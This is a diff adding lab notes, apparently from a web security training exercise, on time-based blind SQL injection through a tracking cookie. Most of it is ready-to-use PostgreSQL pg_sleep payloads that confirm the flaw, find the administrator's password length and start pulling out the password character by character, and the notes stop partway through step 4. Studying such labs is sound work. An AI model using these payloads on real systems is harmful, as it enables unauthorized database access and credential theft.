@@ -1,0 +1,28 @@
+Lab #14 - Blind SQL injection with time delays and information retrieval
+
+Vulnerable parameter - tracking cookie
+
+Analysis:
+-----------
+
+1.  Confirm that the app is vulnerable to Blind-Based SQLi
+    payload --> ' || (select pg_sleep(10))--'
+    -->Confirmed
+
+2. Confirm that the users table exists in the database
+
+    payload --> ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--'
+    Translation: We are giving it a boolean statement - if the boolean is true then we are causing the app to wait 10sec, if its false then there will be no time delay. From this we now have a way to infer if something is true/false based on what we query
+
+    ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+    -->Confirmed
+
+3.  Enumerate admin password length
+
+    ' || (select case when (username='administrator' and LENGTH(password) > 19) then pg_sleep(10) else pg_sleep(-1) end from users)--
+    --> confirmed there was a time delay for 19 and not for 20 indicating the password length = 20char
+
+4. Enumerate the password
+
+    ' || (select case when (username='administrator' and substr(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
+ 
